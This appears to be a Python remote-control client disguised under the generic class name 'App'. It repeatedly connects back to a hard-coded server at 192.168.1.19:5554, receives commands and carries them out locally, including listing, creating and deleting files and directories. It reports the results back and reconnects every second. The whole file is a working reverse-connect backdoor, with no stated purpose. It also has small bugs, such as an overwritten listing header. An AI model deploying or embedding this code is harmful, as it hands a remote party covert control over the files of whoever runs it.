import os
import socket
import time

class App:
    def __init__(self):
        self.running = True
        self.hostname = "192.168.1.19" #server ip address
        self.port = 5554
        self.socket = None
          
    def run(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.hostname, self.port))
                
                try:
                    msg_in = sock.recv(1024).decode()
                    response = self.cmd_(msg_in)
                    sock.send(response.encode())
                except Exception as e:
                    print("Failed to received or send from server : ", e)
        
                sock.close()
            except Exception as e:
                print("Failed to connect to server : ", e)
                time.sleep(1)

        
    def cmd_(self, input_):
        cmd = input_[0:input_.find(" ")]
        args = input_[input_.find(" ")+1:len(input_)]
        text = ""
        if cmd in ["cd", "chdir", "goto"]:
            try:
                os.chdir(args)
            except Exception as e:
                text = str(e)
        elif cmd == "mkdir":
            try:
                os.mkdir(args)
                text = "successfully created" + args
            except Exception as e:
                text = str(e)
        elif input_ in ["ls", "dir", "listdir"]:
            try:
                text = "files and directories in" + str(os.getcwd()) + ":"
                text = str(os.listdir(os.getcwd()))
            except Exception as e:
                text = str(e)
        elif cmd in ["remove", "delete", "del", "rm"]:
            try:
                path = os.path.join(os.getcwd(), args)
                os.remove(path)
                text = "successfully deleted directory : " + str(args)
            except Exception as e:
                text = str(e)
        elif cmd in ["removedir", "deletedir", "rmdir"]:
            try:
                path = os.path.join(os.getcwd(), args)
                os.rmdir(path)
            except:
                try:
                    os.remove(args)
                except Exception as e:
                    text = str(e)
        elif cmd in ["print", "cout", "cer", "send", "write"]:
            try:
                print(args)
                text = "successfully printed : " + str(args)
            except Exception as e:
                text = str(e)
        elif input_ in ["exit", "ex", "/exit"]:
            self.running = False
        elif input_ in ["", "help", "/?", "?"]:
            text = "commands : "
            text += "\n cd + path >>>to navigate to the desired directory"
            text += "\n mkdir + name >>>to create a new directory"
            text += "\n ls >>>to get all the directories and files in the current path"
            text += "\n remove + name >>>delete the file"
            text += "\n removedir + name >>>delete the directory"
            text += "\n exit >>>exit program"
        else:
            text = "command not found. type help to get some"
            
        text += "\n current directory : " + str(os.getcwd())
        return text
    

if __name__ == "__main__":
    app = App()
    app.run()